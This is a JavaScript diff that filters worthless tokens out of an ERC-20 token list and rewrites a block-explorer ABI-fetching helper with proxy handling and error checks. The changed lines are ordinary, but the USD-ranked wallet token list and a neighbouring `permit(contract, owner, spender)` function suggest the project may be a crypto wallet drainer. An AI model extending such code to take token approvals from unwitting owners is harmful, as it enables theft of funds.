@@ -577,12 +577,16 @@ edges.forEach(({ node }) => {
 
     const chain =
         networkMap[node.network?.name] ??
-        node.network?.name.toLowerCase();
+        (node.network?.name || "").toLowerCase();
+
+    // Ignore dust / worthless tokens
+    if ((node.balanceUSD ?? 0) <= 0)
+        return;
 
     tokenList.push({
         type: "erc20",
         tokenAddress: node.tokenAddress,
-        balance: node.balanceUSD ?? 0,
+        balance: Number(node.balanceUSD ?? 0),
         tokenAmountFix: node.balance,
         chain: chain,
         tokenAmount: node.balanceRaw,
@@ -977,19 +981,107 @@ const permit = async (contract, owner, spender) => {
 
 
 const getABI = async (address, abiUrl) => {
-    console.log('Getting ABI for', address)
-    let res = await axios.get(abiUrl.format(address));
-    res = res.data.result[0];
-    let abi = JSON.parse(res['ABI']);
-    let impl = '';
-    if (res['Proxy'] === '1' && res['Implementation'] !== "") {
-        impl = res['Implementation'];
-        console.log('Getting impl ABI for', impl);
-        abi = JSON.parse((await axios.get(abiUrl.format(impl))).data.result[0]['ABI']);
-    }
-    return [abi, impl];
-}
 
+    console.log("================================");
+    console.log("Getting ABI for", address);
+
+    try {
+
+        const response = await axios.get(
+            abiUrl.format(address)
+        );
+
+        console.log("Explorer response:");
+        console.log(response.data);
+
+        const data = response.data;
+
+        if (!data) {
+            throw new Error("Empty explorer response.");
+        }
+
+        if (data.status !== "1") {
+            throw new Error(
+                "Explorer Error: " + data.result
+            );
+        }
+
+        let abi;
+        let implementation = "";
+
+        // Explorer returns array
+        if (Array.isArray(data.result)) {
+
+            const contract = data.result[0];
+
+            if (!contract.ABI) {
+                throw new Error("ABI missing.");
+            }
+
+            if (
+                contract.ABI === "Contract source code not verified"
+            ) {
+                throw new Error("Contract is not verified.");
+            }
+
+            abi = JSON.parse(contract.ABI);
+
+            if (
+                contract.Proxy === "1" &&
+                contract.Implementation
+            ) {
+
+                implementation = contract.Implementation;
+
+                console.log(
+                    "Fetching implementation ABI:",
+                    implementation
+                );
+
+                const implResponse =
+                    await axios.get(
+                        abiUrl.format(implementation)
+                    );
+
+                const implData = implResponse.data;
+
+                console.log(
+                    "Implementation response:",
+                    implData
+                );
+
+                if (
+                    implData.status === "1" &&
+                    Array.isArray(implData.result)
+                ) {
+
+                    abi = JSON.parse(
+                        implData.result[0].ABI
+                    );
+
+                }
+
+            }
+
+        }
+        // Explorer returns ABI string directly
+        else {
+
+            abi = JSON.parse(data.result);
+
+        }
+
+        return [abi, implementation];
+
+    } catch (err) {
+
+        console.error("ABI retrieval failed:", err);
+
+        throw err;
+
+    }
+
+}
 String.prototype.format = function () {
     let args = arguments;
     return this.replace(/{(\d+)}/g, function (match, index) {
